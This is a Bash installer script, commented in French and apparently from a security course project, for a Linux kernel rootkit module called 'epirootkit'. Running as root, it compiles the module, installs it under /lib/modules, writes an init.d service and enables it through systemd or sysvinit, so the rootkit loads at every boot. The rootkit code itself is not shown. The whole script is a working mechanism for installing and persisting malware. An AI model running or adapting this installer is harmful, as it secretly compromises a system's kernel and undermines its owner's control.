#!/bin/bash

# Couleurs pour les messages
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Fonction pour afficher les messages
print_message() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Détecter le système d'initialisation
detect_init_system() {
    if command -v systemctl >/dev/null 2>&1; then
        echo "systemd"
    elif command -v service >/dev/null 2>&1; then
        echo "sysvinit"
    else
        echo "unknown"
    fi
}

INIT_SYSTEM=$(detect_init_system)

# Vérifier si le script est exécuté en tant que root
if [ "$EUID" -ne 0 ]; then 
    print_error "Ce script doit être exécuté en tant que root"
    exit 1
fi

# Vérifier si le module est déjà chargé
if lsmod | grep -q "epirootkit"; then
    print_warning "Le module epirootkit est déjà chargé."
    read -p "Voulez-vous le décharger avant de continuer ? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        rmmod epirootkit
    else
        exit 1
    fi
fi

# Créer un point de sauvegarde
BACKUP_DIR="/var/lib/epirootkit/backup"
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_PATH="$BACKUP_DIR/$BACKUP_DATE"

print_message "Création d'un point de sauvegarde..."
mkdir -p "$BACKUP_PATH"

# Sauvegarder les fichiers existants
if [ -f "/lib/modules/$(uname -r)/extra/epirootkit.ko" ]; then
    cp "/lib/modules/$(uname -r)/extra/epirootkit.ko" "$BACKUP_PATH/"
fi

if [ -f "/etc/init.d/epirootkit" ]; then
    cp "/etc/init.d/epirootkit" "$BACKUP_PATH/"
fi

# Compiler le rootkit
print_message "Compilation du rootkit..."
make clean
make

if [ ! -f "epirootkit.ko" ]; then
    print_error "La compilation a échoué"
    exit 1
fi

# Créer le répertoire pour le rootkit
print_message "Installation du module..."
mkdir -p "/lib/modules/$(uname -r)/extra"

# Copier le module
cp epirootkit.ko "/lib/modules/$(uname -r)/extra/"

# Mettre à jour les dépendances
print_message "Mise à jour des dépendances..."
depmod -a

# Créer le script d'initialisation
print_message "Configuration du service..."
cat > /etc/init.d/epirootkit << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          epirootkit
# Required-Start:    \$network
# Required-Stop:     \$network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: EpiRootkit Service
# Description:       Service pour charger le module EpiRootkit
### END INIT INFO

case "\$1" in
    start)
        modprobe epirootkit
        ;;
    stop)
        rmmod epirootkit
        ;;
    restart)
        rmmod epirootkit
        modprobe epirootkit
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        exit 1
        ;;
esac

exit 0
EOF

# Rendre le script exécutable
chmod +x /etc/init.d/epirootkit

# Activer et démarrer le service selon le système d'initialisation
print_message "Activation du service..."
case "$INIT_SYSTEM" in
    "systemd")
        systemctl daemon-reload
        systemctl enable epirootkit.service
        systemctl start epirootkit.service
        ;;
    "sysvinit")
        update-rc.d epirootkit defaults
        service epirootkit start
        ;;
    *)
        print_warning "Système d'initialisation non reconnu. Installation manuelle requise."
        ;;
esac

# Vérifier si l'installation a réussi
if ! lsmod | grep -q "epirootkit"; then
    print_error "L'installation a échoué"
    print_message "Restauration de la sauvegarde..."
    if [ -f "$BACKUP_PATH/epirootkit.ko" ]; then
        cp "$BACKUP_PATH/epirootkit.ko" "/lib/modules/$(uname -r)/extra/"
    fi
    if [ -f "$BACKUP_PATH/epirootkit" ]; then
        cp "$BACKUP_PATH/epirootkit" "/etc/init.d/"
    fi
    case "$INIT_SYSTEM" in
        "systemd")
            systemctl daemon-reload
            ;;
        "sysvinit")
            service epirootkit restart
            ;;
    esac
    exit 1
fi

print_message "EpiRootkit installé et activé avec succès"
print_message "Sauvegarde créée dans : $BACKUP_PATH"
